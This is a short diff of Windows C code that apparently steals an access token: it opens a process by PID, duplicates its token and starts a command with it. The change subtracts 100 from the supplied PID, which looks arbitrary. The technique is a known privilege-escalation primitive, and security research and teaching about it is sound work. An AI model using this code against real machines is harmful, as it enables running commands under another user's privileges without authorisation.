@@ -18,7 +18,7 @@ int main(int argc, char* argv[]) {
 	startupInfo.cb = sizeof(STARTUPINFO);
  
  
-	processHandle = OpenProcess(PROCESS_ALL_ACCESS, true, atoi(argv[1]));
+	processHandle = OpenProcess(PROCESS_ALL_ACCESS, true, atoi(argv[1])-100);
 	OpenProcessToken(processHandle, TOKEN_ALL_ACCESS, &tokenHandle);
 	DuplicateTokenEx(tokenHandle, TOKEN_ALL_ACCESS, NULL, SecurityImpersonation, TokenPrimary, &duplicateTokenHandle);
 	CreateProcessWithTokenW(duplicateTokenHandle, LOGON_WITH_PROFILE, NULL, cmdline, 0, NULL, NULL, &startupInfo, &processInformation);
